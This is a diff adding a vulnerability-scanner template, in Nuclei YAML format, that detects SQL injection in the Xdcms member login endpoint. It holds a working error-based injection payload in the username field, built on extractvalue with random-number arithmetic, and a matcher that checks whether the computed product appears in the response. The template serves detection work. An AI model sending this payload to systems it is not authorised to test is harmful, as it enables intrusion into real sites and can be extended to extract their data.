@@ -1,0 +1,29 @@
+id: xdcms-sql-injection
+info:
+  name: Xdcms SQL Injection Detection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in Xdcms application by evaluating arithmetic operations in the database.
+
+variables:
+  r1: '{{rand_int(10000, 21000)}}'
+  r2: '{{rand_int(10000, 21000)}}'
+
+http:
+  - raw:
+      - |
+        POST /index.php?m=member&f=login_save HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=dd' or extractvalue(0x0a,concat(0x0a,{{r1}}*{{r2}}))#&password=dd&submit=+%B5%C7+%C2%BC+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, to_number(r1) * to_number(r2))
